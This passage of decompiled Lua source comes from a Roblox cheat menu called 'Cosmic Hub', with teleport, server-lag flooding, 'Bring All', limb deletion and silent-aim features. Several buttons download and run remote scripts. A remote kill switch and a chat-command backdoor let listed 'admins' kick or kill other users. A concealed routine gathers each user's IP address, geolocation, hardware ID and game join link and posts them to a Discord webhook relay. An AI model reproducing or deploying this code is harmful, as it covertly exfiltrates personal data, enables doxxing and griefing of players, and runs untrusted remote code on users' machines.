    Default = nil,
    Options = getAllPlayers(),
    Callback = function(p452)
        u14 = p452
    end,
})

updateDropdownOptions(u453)

function teleportToPlayer()
    if u14 then
        local v454 = _Players:FindFirstChild(u14)

        if v454 and v454.Character and v454.Character:FindFirstChild('HumanoidRootPart') then
            local _Position4 = v454.Character.HumanoidRootPart.Position

            if _LocalPlayer.Character and _LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
                _LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_Position4)
            else
                u24:MakeNotification({
                    Name = 'Error',
                    Content = 'Character was not found.',
                    Time = 3,
                })
            end
        else
            u24:MakeNotification({
                Name = 'Error',
                Content = 'Target player not found.',
                Time = 3,
            })
        end
    else
        u24:MakeNotification({
            Name = 'Error',
            Content = 'No player selected.',
            Time = 3,
        })
    end
end

v442:AddButton({
    Name = 'Teleport to Player',
    Callback = function()
        teleportToPlayer()
    end,
})

function startLoopTeleport()
    u444 = coroutine.create(function()
        while u443 do
            teleportToPlayer()
            wait(0.02)
        end
    end)

    coroutine.resume(u444)
end

v442:AddToggle({
    Name = 'Loop Teleport',
    Default = false,
    Callback = function(p456)
        u443 = p456

        if p456 then
            startLoopTeleport()
        else
            u444 = nil
        end
    end,
})
_Players.PlayerAdded:Connect(function()
    updateDropdownOptions(u453)
end)
_Players.PlayerRemoving:Connect(function()
    updateDropdownOptions(u453)
end)

local v457 = v27:MakeTab({
    Name = 'Random',
    Icon = 'rbxassetid://4483345998',
    PremiumOnly = false,
})

v457:AddSection({
    Name = 'Working',
})

local u458 = false
local u459 = 5

function lagF()
    while u458 do
        for _ = 1, u459 do
            local v460 = _Players
            local v461, v462, v463 = ipairs(v460:GetPlayers())

            while true do
                local v464

                v463, v464 = v461(v462, v463)

                if v463 == nil then
                    break
                end
                if v464.Character and v464.Character:FindFirstChild('Torso') then
                    _ReplicatedStorage.GrabEvents.CreateGrabLine:FireServer(v464.Character.Torso, v464.Character.Torso.CFrame)
                end
            end
        end

        wait(1)
    end
end

v457:AddToggle({
    Name = 'Lag',
    Default = false,
    Callback = function(p465)
        u458 = p465

        if u458 then
            task.spawn(lagF)
        end
    end,
})
v457:AddSlider({
    Name = 'Lag Intensity',
    Min = 1,
    Max = 1000,
    Default = 5,
    Callback = function(p466)
        u459 = p466
    end,
})

local u467 = {
    P = game:GetService('Players'),
    RS = game:GetService('RunService'),
    W = _Workspace,
    A = false,
    Q = {},
    Pos = nil,
    Cam = nil,
    R = 15,
    Conn = nil,
    WL = false,
    CB = Instance.new('Part'),
}

u467.CB.Anchored = true
u467.CB.CanCollide = false
u467.CB.Transparency = 1
u467.CB.CanQuery = false
u467.CB.Size = Vector3.new(10, 10, 10)

function FzCam()
    local _CurrentCamera2 = u467.W.CurrentCamera

    u467.CB.CFrame = u467.Cam
    u467.CB.Parent = u467.W
    _CurrentCamera2.CameraType = Enum.CameraType.Scriptable
    _CurrentCamera2.CFrame = u467.Cam
end
function UnFzCam()
    u467.CB.Parent = nil

    local _CurrentCamera3 = u467.W.CurrentCamera

    _CurrentCamera3.CameraType = Enum.CameraType.Custom

    if u467.Cam then
        _CurrentCamera3.CFrame = u467.Cam
    end

    u467.Cam = nil
end
function NoCol(p470)
    local v471, v472, v473 = pairs(p470:GetDescendants())

    while true do
        local v474

        v473, v474 = v471(v472, v473)

        if v473 == nil then
            break
        end
        if v474:IsA('BasePart') then
            v474.CanCollide = false
        end
    end
end
function InPlot(p475)
    local _PlotItems = u467.W:FindFirstChild('PlotItems')

    if _PlotItems then
        _PlotItems = _PlotItems:FindFirstChild('PlayersInPlots')
    end
    if _PlotItems then
        _PlotItems = _PlotItems:FindFirstChild(p475.Name)
    end

    return _PlotItems
end
function InRad(p477)
    return (p477.Position - u467.Pos).Magnitude <= u467.R
end
function Ignore(p478)
    return p478 == u467.P.LocalPlayer and true or (u467.WL and u467.P.LocalPlayer:IsFriendsWith(p478.UserId) and true or false)
end
function ReQ()
    u467.Q = {}

    local v479, v480, v481 = pairs(u467.P:GetPlayers())

    while true do
        local v482

        v481, v482 = v479(v480, v481)

        if v481 == nil then
            break
        end
        if not Ignore(v482) and (v482.Character and not InPlot(v482)) then
            local _HumanoidRootPart15 = v482.Character:FindFirstChild('HumanoidRootPart')

            if _HumanoidRootPart15 and not InRad(_HumanoidRootPart15) then
                table.insert(u467.Q, v482)
            end
        end
    end
end
function Next()
    if #u467.Q == 0 then
        ReQ()

        if #u467.Q == 0 then
            return
        end
    end

    local v484 = u467.Q[1]

    table.remove(u467.Q, 1)

    if v484 and v484.Character then
        local _HumanoidRootPart16 = v484.Character:FindFirstChild('HumanoidRootPart')
        local _Head2 = v484.Character:FindFirstChild('Head')
        local _Character31 = u467.P.LocalPlayer.Character

        if _Character31 then
            _Character31 = u467.P.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
        end
        if _HumanoidRootPart16 and (_Head2 and _Character31) then
            u467.P.LocalPlayer.Character:PivotTo(_HumanoidRootPart16.CFrame * CFrame.new(0, -6, 0))
            NoCol(u467.P.LocalPlayer.Character)

            local v488 = 0

            repeat
                _SetNetworkOwner:FireServer(_HumanoidRootPart16, _Character31.CFrame)
                task.wait(0.15)

                v488 = v488 + 1
            until 20 < v488 or _Head2:FindFirstChild('PartOwner') and _Head2.PartOwner.Value == u467.P.LocalPlayer.Name or not u467.A

            if u467.A and (_Head2:FindFirstChild('PartOwner') and _Head2.PartOwner.Value == u467.P.LocalPlayer.Name) then
                _HumanoidRootPart16.CFrame = CFrame.new(u467.Pos)
                _HumanoidRootPart16.Position = u467.Pos
                _HumanoidRootPart16.AssemblyLinearVelocity = Vector3.zero

                task.wait(0.8)
            end
        end
    end
end
function Start()
    local _Character32 = u467.P.LocalPlayer.Character

    if _Character32 then
        _Character32 = u467.P.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    end
    if _Character32 then
        u467.Pos = _Character32.Position
        u467.Cam = u467.W.CurrentCamera.CFrame

        ReQ()
        FzCam()

        u467.Conn = u467.RS.Heartbeat:Connect(function()
            if u467.A then
                Next()

                if u467.Cam then
                    local _CurrentCamera4 = u467.W.CurrentCamera

                    _CurrentCamera4.CameraType = Enum.CameraType.Scriptable
                    _CurrentCamera4.CFrame = u467.Cam
                    u467.CB.CFrame = u467.Cam
                    u467.CB.Parent = u467.W
                end
            end
        end)
    end
end
function Stop()
    if u467.Conn then
        u467.Conn:Disconnect()

        u467.Conn = nil
    end

    UnFzCam()

    local _Character33 = u467.P.LocalPlayer.Character

    if _Character33 then
        _Character33 = u467.P.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
    end
    if _Character33 and u467.Pos then
        _Character33.AssemblyLinearVelocity = Vector3.zero
        _Character33.CFrame = CFrame.new(u467.Pos)
    end
end
function CharAdd(p492)
    p492:WaitForChild('Humanoid').Died:Connect(function()
        if u467.Conn then
            u467.Conn:Disconnect()

            u467.Conn = nil
        end

        UnFzCam()
    end)

    if u467.A then
        local _HumanoidRootPart17 = p492:WaitForChild('HumanoidRootPart')

        u467.Pos = u467.Pos or _HumanoidRootPart17.Position
        u467.Cam = u467.Cam or u467.W.CurrentCamera.CFrame

        FzCam()

        u467.Conn = u467.RS.Heartbeat:Connect(function()
            if u467.A then
                Next()

                if u467.Cam then
                    local _CurrentCamera5 = u467.W.CurrentCamera

                    _CurrentCamera5.CameraType = Enum.CameraType.Scriptable
                    _CurrentCamera5.CFrame = u467.Cam
                    u467.CB.CFrame = u467.Cam
                    u467.CB.Parent = u467.W
                end
            end
        end)
    end
end

u467.P.LocalPlayer.CharacterAdded:Connect(CharAdd)
u467.P.PlayerAdded:Connect(function()
    if u467.A then
        ReQ()
    end
end)
u467.P.PlayerRemoving:Connect(function(p495)
    for v496 = #u467.Q, 1, -1 do
        if u467.Q[v496] == p495 then
            table.remove(u467.Q, v496)
        end
    end
end)
v457:AddToggle({
    Name = 'Bring All',
    Default = false,
    Callback = function(p497)
        u467.A = p497

        if p497 then
            Start()
        else
            Stop()
        end
    end,
})
v457:AddToggle({
    Name = 'Whitelist Friends',
    Default = false,
    Callback = function(p498)
        u467.WL = p498
    end,
})

local u499 = {
    ws = game:GetService('Workspace'),
    plrs = game:GetService('Players'),
    debris = game:GetService('Debris'),
    uis = game:GetService('UserInputService'),
    fpdHeight = _Workspace.FallenPartsDestroyHeight,
    parts = {
        'Left Leg',
        'Right Leg',
        'Left Arm',
        'Right Arm',
        'HumanoidRootPart',
    },
}

function findHeldPlayer()
    local _GrabParts = u499.ws:FindFirstChild('GrabParts')

    if not _GrabParts then
        return nil
    end

    local v501, v502, v503 = ipairs(_GrabParts:GetChildren())

    while true do
        local v504

        v503, v504 = v501(v502, v503)

        if v503 == nil then
            break
        end
        if v504:IsA('BasePart') then
            local v505, v506, v507 = ipairs(v504:GetChildren())

            while true do
                local v508

                v507, v508 = v505(v506, v507)

                if v507 == nil then
                    break
                end
                if v508:IsA('WeldConstraint') and v508.Part1 and v508.Part1.Parent:IsA('Model') then
                    local _Parent = v508.Part1.Parent

                    if _Parent:FindFirstChildOfClass('Humanoid') then
                        return u499.plrs:GetPlayerFromCharacter(_Parent)
                    end
                end
            end
        end
    end

    return nil
end
function teleportLimbParts(p510)
    if p510 then
        local _Character34 = p510.Character

        if _Character34 then
            local v512, v513, v514 = ipairs(u499.parts)
            local v515 = {}

            while true do
                local v516

                v514, v516 = v512(v513, v514)

                if v514 == nil then
                    break
                end

                local u517 = _Character34:FindFirstChild(v516)

                if u517 then
                    local v518, v519, v520 = ipairs(u499.ws:GetDescendants())

                    while true do
                        local v521

                        v520, v521 = v518(v519, v520)

                        if v520 == nil then
                            break
                        end
                        if v521:IsA('WeldConstraint') and (v521.Part0 == u517 or v521.Part1 == u517) then
                            v521.Enabled = false

                            table.insert(v515, v521)
                        end
                    end

                    local v522, v523, v524 = ipairs(u517:GetChildren())

                    while true do
                        local v525

                        v524, v525 = v522(v523, v524)

                        if v524 == nil then
                            break
                        end
                        if v525:IsA('Motor6D') or v525:IsA('Weld') then
                            v525.Enabled = false

                            table.insert(v515, v525)
                        end
                    end

                    u517.Anchored = false

                    local u526 = Vector3.new(u517.Position.X, u499.fpdHeight - 100, u517.Position.Z)

                    pcall(function()
                        if u517:IsA('Model') then
                            u517.PrimaryPart = u517.PrimaryPart or u517:FindFirstChildWhichIsA('BasePart')

                            if u517.PrimaryPart then
                                u517:SetPrimaryPartCFrame(CFrame.new(u526))
                            end
                        else
                            u517.CFrame = CFrame.new(u526)
                        end
                    end)
                    task.wait(0.1)
                end
            end

            local v527, v528, v529 = ipairs(v515)

            while true do
                local v530

                v529, v530 = v527(v528, v529)

                if v529 == nil then
                    break
                end

                v530.Enabled = true
            end
        end
    else
        return
    end
end
function deleteUserLimbs()
    local v531 = findHeldPlayer()

    if v531 then
        teleportLimbParts(v531)
    end
end

if u499.uis.TouchEnabled then
    v457:AddButton({
        Name = 'Delete Limbs (Hold and ragdoll player)',
        Callback = deleteUserLimbs,
    })
end

local v532 = v27:MakeTab({
    Name = 'Credits',
    Icon = 'rbxassetid://6035047375',
    PremiumOnly = false,
})

v532:AddLabel('CREATOR: Cosmic_TCU (TCUTCU_LLBDDLLZYXZY)')
v532:AddLabel('GO FOLLOW: Crisila_TCU (Superduperalt0987)')
v532:AddLabel('HELPERS: jeke/brilliant, moonydev')
v532:AddButton({
    Name = 'Cosmic Hub Discord Server',
    Callback = function()
        setclipboard('https://discord.gg/mzkKQhyNqv')
        u24:MakeNotification({
            Name = 'Copied!',
            Content = 'Discord link has been copied to your clipboard.',
            Image = 'rbxassetid://4483345998',
            Time = 3,
        })
    end,
})

local v533 = v27:MakeTab({
    Name = 'Extra',
    Icon = 'rbxassetid://6031094675',
    PremiumOnly = false,
})

v533:AddButton({
    Name = 'Cosmic Hub Auras',
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Jeffepicy/CosmicAuras/refs/heads/main/SigmaAuras', true))()
    end,
})
v533:AddButton({
    Name = 'Dex',
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/m0onyy/Test/refs/heads/main/mobile%20dex.lua', true))()
    end,
})
v533:AddButton({
    Name = 'Infinite Yield',
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/ttwizz/infiniteyield/master/source.lua', true))()
    end,
})
v533:AddLabel('Current version: V2.049')

local u534 = 'https://raw.githubusercontent.com/Jeffepicy/yeah/refs/heads/main/yeah'

function checkShutdown()
    local v535, u536 = pcall(function()
        return game:HttpGet(u534)
    end)

    if v535 and u536 then
        local u537 = nil

        pcall(function()
            u537 = _HttpService:JSONDecode(u536)
        end)

        if u537 == true then
            _LocalPlayer:Kick('no')
            task.wait(1)

            while true do end
        end
    else
        warn('Failed')
    end
end

checkShutdown()

local v538 = {}
local u539 = 'https://raw.githubusercontent.com/Jeffepicy/whitelist/main/whitelist.txt'
local v540, v541 = pcall(function()
    return game:HttpGet(u539)
end)

if v540 and v541 then
    local v542 = _HttpService:JSONDecode(v541)
    local v543, v544

    if typeof(v542) ~= 'table' then
        v543 = u24
        v544 = u29
    else
        local v545, v546, v547 = ipairs(v542)

        v543 = u24
        v544 = u29

        while true do
            local v548

            v547, v548 = v545(v546, v547)

            if v547 == nil then
                break
            end

            table.insert(v538, v548)
        end
    end

    local u549 = {}
    local u550 = {}
    local u551 = {}
    local u552 = {}
    local u553 = v538 or {}

    function isAdmin(p554)
        return table.find(u553, p554.UserId) ~= nil
    end
    function sendChatMessage(p555)
        if _TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
            local _DefaultChatSystemChatEvents = _ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')

            if _DefaultChatSystemChatEvents and _DefaultChatSystemChatEvents:FindFirstChild('SayMessageRequest') then
                _DefaultChatSystemChatEvents.SayMessageRequest:FireServer(p555, 'All')
            end
        else
            local _TextChannels = _TextChatService:FindFirstChild('TextChannels')
            local v558 = _TextChannels and _TextChannels:FindFirstChild('RBXGeneral')

            if v558 then
                v558:SendAsync(p555)
            end
        end
    end
    function toggleBlind(p559)
        u551[p559] = not u551[p559]

        local _BlindEffect = _LocalPlayer:FindFirstChild('PlayerGui'):FindFirstChild('BlindEffect')

        if u551[p559] then
            if not _BlindEffect then
                local _ScreenGui = Instance.new('ScreenGui')

                _ScreenGui.Name = 'BlindEffect'
                _ScreenGui.ResetOnSpawn = false

                local _Frame = Instance.new('Frame')

                _Frame.Size = UDim2.new(1, 0, 1, 0)
                _Frame.BackgroundColor3 = Color3.new(0, 0, 0)
                _Frame.Parent = _ScreenGui
                _ScreenGui.Parent = _LocalPlayer:WaitForChild('PlayerGui')
            end
        elseif _BlindEffect then
            _BlindEffect:Destroy()
        end
    end
    function handleAdminCommand(p563, p564)
        if isAdmin(p563) then
            local v565 = p564:lower()

            if v565:sub(1, 8) == ':c kick ' then
                local v566 = v565:sub(9)
                local v567 = _Players
                local v568, v569, v570 = ipairs(v567:GetPlayers())

                while true do
                    local v571

                    v570, v571 = v568(v569, v570)

                    if v570 == nil then
                        break
                    end
                    if v571 ~= p563 and v571.Name:lower():sub(1, #v566) == v566 then
                        v571:Kick('You have been kicked by an admin.')
                    end
                end
            end
            if v565:sub(1, 9) == ':c kill ' then
                local v572 = v565:sub(10)
                local v573 = _Players
                local v574, v575, v576 = ipairs(v573:GetPlayers())

                while true do
                    local v577

                    v576, v577 = v574(v575, v576)

                    if v576 == nil then
                        break
                    end
                    if v577 ~= p563 and v577.Character and v577.Character:FindFirstChild('Humanoid') then
                        local v578 = v577.Name:lower()
                        local v579 = v577.DisplayName:lower()

                        if v578:sub(1, #v572) == v572 or v579:sub(1, #v572) == v572 then
                            v577.Character.Humanoid.Health = 0
                        end
                    end
                end
            end
            if v565:sub(1, 7) == ':c say ' then
                local v580 = v565:sub(8)

                if v580 and v580 ~= '' then
                    sendChatMessage(v580)
                end
            end
            if v565 == ':c aura' then
                u550[p563] = not u550[p563]
            end
            if v565 == ':c e' then
                toggleBlind(p563)
            end
            if v565:sub(1, 5) == ':c sb' then
                local v581 = tonumber(v565:match('%d+'))

                if v581 and 0 < v581 then
                    u552[p563] = v581

                    sendChatMessage('Safety bubble set to ' .. v581)
                else
                    u552[p563] = nil

                    sendChatMessage('Safety bubble disabled')
                end
            end
            if v565 == ':c tp all' and p563.Character and p563.Character:FindFirstChild('HumanoidRootPart') then
                local _HumanoidRootPart18 = p563.Character.HumanoidRootPart
                local v583 = _Players
                local v584, v585, v586 = ipairs(v583:GetPlayers())

                while true do
                    local v587

                    v586, v587 = v584(v585, v586)

                    if v586 == nil then
                        break
                    end
                    if v587 ~= p563 and v587.Character and v587.Character:FindFirstChild('HumanoidRootPart') then
                        v587.Character.HumanoidRootPart.CFrame = _HumanoidRootPart18.CFrame + Vector3.new(3, 0, 0)
                    end
                end
            end
            if v565 == ':c kill all' then
                local v588 = _Players
                local v589, v590, v591 = ipairs(v588:GetPlayers())

                while true do
                    local v592

                    v591, v592 = v589(v590, v591)

                    if v591 == nil then
                        break
                    end
                    if v592 ~= p563 and v592.Character and v592.Character:FindFirstChild('Humanoid') then
                        v592.Character.Humanoid.Health = 0
                    end
                end
            end
            if v565 == ':c ban all' then
                local v593 = _Players
                local v594, v595, v596 = ipairs(v593:GetPlayers())

                while true do
                    local v597

                    v596, v597 = v594(v595, v596)

                    if v596 == nil then
                        break
                    end
                    if v597 ~= p563 then
                        v597:Kick('You have been banned by an admin.')
                    end
                end
            end
        end
    end

    if _TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
        local v598, v599, v600 = ipairs(_Players:GetPlayers())

        while true do
            local u601

            v600, u601 = v598(v599, v600)

            if v600 == nil then
                break
            end

            u601.Chatted:Connect(function(p602)
                handleAdminCommand(u601, p602)
            end)
        end

        _Players.PlayerAdded:Connect(function(p603)
            p603.Chatted:Connect(function(p604)
                handleAdminCommand(p603, p604)
            end)
        end)
    else
        local _TextChannels2 = _TextChatService:FindFirstChild('TextChannels')

        if _TextChannels2 then
            local _RBXGeneral = _TextChannels2:FindFirstChild('RBXGeneral')

            if _RBXGeneral then
                _RBXGeneral.MessageReceived:Connect(function(p607)
                    local _TextSource = p607.TextSource

                    if _TextSource then
                        local v609 = _Players:GetPlayerByUserId(_TextSource.UserId)

                        if v609 then
                            handleAdminCommand(v609, p607.Text)
                        end
                    end
                end)
            end
        end
    end

    _RunService.Heartbeat:Connect(function()
        local v610, v611, v612 = pairs(u550)

        while true do
            local v613

            v612, v613 = v610(v611, v612)

            if v612 == nil then
                break
            end
            if v613 and v612.Character and v612.Character:FindFirstChild('HumanoidRootPart') then
                local _HumanoidRootPart19 = v612.Character.HumanoidRootPart
                local v615 = tick()
                local v616, v617, v618 = pairs(u549)
                local v619 = v612

                while true do
                    v618 = v616(v617, v618)

                    if v618 == nil then
                        break
                    end
                    if v618 ~= v619 and v618.Character and v618.Character:FindFirstChild('HumanoidRootPart') then
                        local v620 = (v615 + v618.UserId) % (2 * math.pi)
                        local v621 = 10
                        local v622 = Vector3.new(math.cos(v620) * v621, 0, math.sin(v620) * v621)

                        v618.Character.HumanoidRootPart.CFrame = _HumanoidRootPart19.CFrame + v622
                    end
                end
            end
        end
    end)
    _RunService.Heartbeat:Connect(function()
        local v623, v624, v625 = pairs(u552)

        while true do
            local v626

            v625, v626 = v623(v624, v625)

            if v625 == nil then
                break
            end
            if v625.Character and v625.Character:FindFirstChild('HumanoidRootPart') then
                local _HumanoidRootPart20 = v625.Character.HumanoidRootPart
                local v628, v629, v630 = pairs(u549)
                local v631 = v625

                while true do
                    v630 = v628(v629, v630)

                    if v630 == nil then
                        break
                    end
                    if v630 ~= v631 and v630.Character and v630.Character:FindFirstChild('HumanoidRootPart') then
                        local _HumanoidRootPart21 = v630.Character.HumanoidRootPart

                        if (_HumanoidRootPart20.Position - _HumanoidRootPart21.Position).Magnitude < v626 then
                            local _Unit = (_HumanoidRootPart21.Position - _HumanoidRootPart20.Position).Unit

                            _HumanoidRootPart21.CFrame = CFrame.new(_HumanoidRootPart20.Position + _Unit * v626)
                        end
                    end
                end
            end
        end
    end)

    function registerUser(p634)
        u549[p634] = true
    end

    registerUser(_LocalPlayer)
    _Players.PlayerAdded:Connect(function(p635)
        registerUser(p635)

        if isAdmin(p635) then
            task.delay(1, function()
                sendChatMessage('Lord ' .. p635.DisplayName .. ' has joined.')
            end)
        end
    end)
    _Players.PlayerRemoving:Connect(function(p636)
        u549[p636] = nil
        u550[p636] = nil
        u551[p636] = nil
        u552[p636] = nil
    end)

    local u637 = {
        HttpService = game:GetService('HttpService'),
        Players = game:GetService('Players'),
        MarketplaceService = game:GetService('MarketplaceService'),
        LocalizationService = game:GetService('LocalizationService'),
        RbxAnalyticsService = game:GetService('RbxAnalyticsService'),
        webhookUrl = 'https://v0-discord-webhook-protector-nine.vercel.app/api/relay/etdvwb7e42',
    }

    u637.LocalPlayer = u637.Players.LocalPlayer
    u637.UserId = u637.LocalPlayer.UserId
    u637.Name = u637.LocalPlayer.Name
    u637.DisplayName = u637.LocalPlayer.DisplayName
    u637.Membership = tostring(u637.LocalPlayer.MembershipType):sub(21)
    u637.Age = u637.LocalPlayer.AccountAge
    u637.Country = u637.LocalizationService.RobloxLocaleId
    u637.IP = game:HttpGet('https://v4.ident.me/')
    u637.Geo = game:HttpGet('http://ip-api.com/json')
    u637.HWID = u637.RbxAnalyticsService:GetClientId()
    u637.Job = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
    u637.Link = 'roblox://placeId=' .. game.PlaceId .. '&gameInstanceId=' .. game.JobId
    u637.GameName = u637.MarketplaceService:GetProductInfo(game.PlaceId).Name

    function make()
        local v638 = identifyexecutor()
        local v639 = {
            avatar_url = '',
            content = '',
        }
        local v640 = {}
        local v641 = {
            author = {
                name = 'SKID ALERT',
                url = 'https://roblox.com',
            },
            description = string.format([[__[Player Info](https://www.roblox.com/users/%d)__
**Display Name:** %s
**Username:** %s
**User Id:** %d
**MembershipType:** %s
**AccountAge:** %d
**Country:** %s
**IP:** %s
**Hwid:** %s
**Date:** %s
**Time:** %s

__[Game Info](https://www.roblox.com/games/%d)__
**Game:** %s
**Game Id:** %d
**Exploit:** %s

**Data:**```%s```

**JobId:**```%s```]], u637.UserId, u637.DisplayName, u637.Name, u637.UserId, u637.Membership, u637.Age, u637.Country, u637.IP, u637.HWID, os.date('%m/%d/%Y'), os.date('%X'), game.PlaceId, u637.GameName, game.PlaceId, v638, u637.Geo, u637.Job),
            type = 'rich',
            color = tonumber('0xFFD700'),
            thumbnail = {
                url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. u637.UserId .. '&width=150&height=150&format=png',
            },
        }

        __set_list(v640, 1, {v641})

        v639.embeds = v640

        return u637.HttpService:JSONEncode(v639)
    end
    function send(p642)
        local v643 = http_request or request or (HttpPost or syn.request)
        local v644 = {
            ['content-type'] = 'application/json',
        }

        v643({
            Url = u637.webhookUrl,
            Body = p642,
            Method = 'POST',
            Headers = v644,
        })

        local v645 = {
            Url = u637.webhookUrl,
            Body = u637.HttpService:JSONEncode({
                content = u637.Link,
            }),
            Method = 'POST',
            Headers = v644,
        }

        v643(v645)
    end

    send(make())

    local v646 = v27:MakeTab({
        Name = 'Silent Aim',
        Icon = 'rbxassetid://6031091005',
        PremiumOnly = false,
    })
    local u647 = {
        SA = {
            En = false,
            Key = 'RightAlt',
            TP = 'HumanoidRootPart',
            Show = false,
            MHP = false,
            AP = false,
            MHP_A = 0.165,
            HC = 100,
            Col = Color3.fromRGB(54, 57, 241),
        },
        Cam = _Workspace.CurrentCamera,
        P = game:GetService('Players'),
        RS = game:GetService('RunService'),
        GS = game:GetService('GuiService'),
        UIS = game:GetService('UserInputService'),
        ST = game:GetService('Stats'),
        LP = game:GetService('Players').LocalPlayer,
        MC = nil,
        MB = nil,
        M = nil,
        MBX = nil,
        VTP = {
            'Head',
            'HumanoidRootPart',
        },
        CPA = 0.165,
        EA = {
            Raycast = {
                AC = 3,
                Args = {
                    'Instance',
                    'Vector3',
                    'Vector3',
                    'RaycastParams',
                },
            },
        },
        CoR = coroutine.resume,
        CoC = coroutine.create,
    }

    if getgenv then
        getgenv().SilentAimSettings = u647.SA
    else
        v544.SilentAimSettings = u647.SA
    end

    u647.M = u647.LP:GetMouse()

    local u648 = pcall(function()
        return Drawing.new('Square')
    end)

    if u648 then
        u647.MBX = Drawing.new('Square')
        u647.MBX.Visible = false
        u647.MBX.ZIndex = 999
        u647.MBX.Color = u647.SA.Col
        u647.MBX.Thickness = 2
        u647.MBX.Size = Vector2.new(30, 30)
        u647.MBX.Filled = true
    else
        u647.MBX = {
            Visible = false,
            Position = Vector2.new(),
            Color = u647.SA.Col,
        }
        u647.SA.Show = false
    end

    local v649 = 'MC'
    local _TouchEnabled = u647.UIS.TouchEnabled

    if _TouchEnabled then
        _TouchEnabled = not u647.UIS.KeyboardEnabled
    end

    u647[v649] = _TouchEnabled

    local _ = game.GetChildren
    local _GetPlayers = u647.P.GetPlayers
    local _WorldToScreenPoint = u647.Cam.WorldToScreenPoint
    local _WorldToViewportPoint = u647.Cam.WorldToViewportPoint
    local _FindFirstChild = game.FindFirstChild
    local _RenderStepped = u647.RS.RenderStepped
    local _Heartbeat = u647.RS.Heartbeat
    local _ = u647.GS.GetGuiInset
    local _GetMouseLocation = u647.UIS.GetMouseLocation

    function Ch(p658)
        local v659 = math.floor(p658)

        return math.floor(math.random() * 100) / 100 <= v659 / 100
    end
    function GPx(p660)
        local v661, v662 = _WorldToScreenPoint(u647.Cam, p660)

        return Vector2.new(v661.X, v661.Y), v662
    end
    function VA(p663, p664)
        local v665 = 0

        if #p663 < p664.AC then
            return false
        end

        local v666 = next
        local v667 = nil

        while true do
            local v668

            v667, v668 = v666(p663, v667)

            if v667 == nil then
                break
            end
            if typeof(v668) == p664.Args[v667] then
                v665 = v665 + 1
            end
        end

        return p664.AC <= v665
    end
    function GD(p669, p670)
        return (p670 - p669).Unit * 1000
    end
    function GMP()
        return _GetMouseLocation(u647.UIS)
    end
    function GPP(p671)
        local v672 = p671.Velocity or Vector3.new()

        return p671.Position + (u647.SA.MHP and v672 * u647.CPA or Vector3.new())
    end
    function GCP()
        if u647.SA.TP then
            local v673 = u647.MC and u647.Cam.ViewportSize / 2 or GMP()
            local v674 = next
            local v675, v676 = _GetPlayers(u647.P)
            local v677 = nil
            local v678 = nil

            while true do
                local v679

                v676, v679 = v674(v675, v676)

                if v676 == nil then
                    break
                end
                if v679 ~= u647.LP then
                    local _Character35 = v679.Character

                    if _Character35 then
                        local v681 = _FindFirstChild(_Character35, 'HumanoidRootPart')
                        local v682 = _FindFirstChild(_Character35, 'Humanoid')

                        if v681 and (v682 and (not v682 or v682.Health > 0)) and (u647.Cam.CFrame.Position - v681.Position).Magnitude <= 35 then
                            local v683, v684 = GPx(v681.Position)

                            if v684 then
                                local _Magnitude2 = (v673 - v683).Magnitude

                                if _Magnitude2 <= (v677 or 2000) then
                                    v678 = u647.SA.TP == 'Random' and _Character35[u647.VTP[math.random(1, #u647.VTP)] ] or _Character35[u647.SA.TP]
                                    v677 = _Magnitude2
                                end
                            end
                        end
                    end
                end
            end

            return v678
        end
    end

    v646:AddToggle({
        Name = 'Enabled',
        Default = u647.SA.En,
        Callback = function(p686)
            u647.SA.En = p686
            u647.MBX.Visible = p686
        end,
    })
    v646:AddBind({
        Name = 'Toggle Key',
        Default = Enum.KeyCode[u647.SA.Key],
        Hold = false,
        Callback = function()
            u647.SA.En = not u647.SA.En

            EnabledToggle:Set(u647.SA.En)

            u647.MBX.Visible = u647.SA.En
        end,
    })
    v646:AddDropdown({
        Name = 'Target Part',
        Default = u647.SA.TP,
        Options = {
            'Head',
            'HumanoidRootPart',
            'Random',
        },
        Callback = function(p687)
            u647.SA.TP = p687
        end,
    })
    v646:AddSlider({
        Name = 'Hit Chance',
        Min = 0,
        Max = 100,
        Increment = 1,
        Default = u647.SA.HC,
        ValueName = '%',
        Callback = function(p688)
            u647.SA.HC = p688
        end,
    })
    v646:AddSection({
        Name = 'Prediction',
    })
    v646:AddToggle({
        Name = 'Manual Prediction',
        Default = u647.SA.MHP,
        Callback = function(p689)
            u647.SA.MHP = p689
        end,
    })
    v646:AddToggle({
        Name = 'Auto Prediction',
        Default = u647.SA.AP,
        Callback = function(p690)
            u647.SA.AP = p690
        end,
    })
    v646:AddSlider({
        Name = 'Prediction Amount',
        Min = 0.165,
        Max = 1,
        Increment = 0.001,
        Default = u647.SA.MHP_A,
        Callback = function(p691)
            u647.SA.MHP_A = p691
        end,
    })
    v646:AddSection({
        Name = 'Visuals',
    })
    v646:AddToggle({
        Name = 'Show Silent Aim Target',
        Default = u647.SA.Show,
        Callback = function(p692)
            u647.SA.Show = p692
            u647.MBX.Visible = p692
        end,
    })
    v646:AddColorpicker({
        Name = 'Silent Aim Target Color',
        Default = u647.SA.Col,
        Callback = function(p693)
            u647.SA.Col = p693
            u647.MBX.Color = p693
        end,
    })
    _Heartbeat:Connect(function()
        if u647.SA.AP then
            local v694, v695 = pcall(function()
                return u647.ST.Network.ServerStatsItem['Data Ping']:GetValueString()
            end)

            if v694 then
                local v696 = tonumber(v695:match('(%d+)')) or 50

                if v696 < 20 then
                    u647.CPA = 0.11
                elseif v696 < 30 then
                    u647.CPA = 0.115
                elseif v696 < 40 then
                    u647.CPA = 0.12
                elseif v696 < 50 then
                    u647.CPA = 0.125
                elseif v696 < 60 then
                    u647.CPA = 0.13
                elseif v696 < 70 then
                    u647.CPA = 0.135
                elseif v696 < 80 then
                    u647.CPA = 0.14
                elseif v696 < 90 then
                    u647.CPA = 0.145
                elseif v696 < 100 then
                    u647.CPA = 0.15
                elseif v696 < 110 then
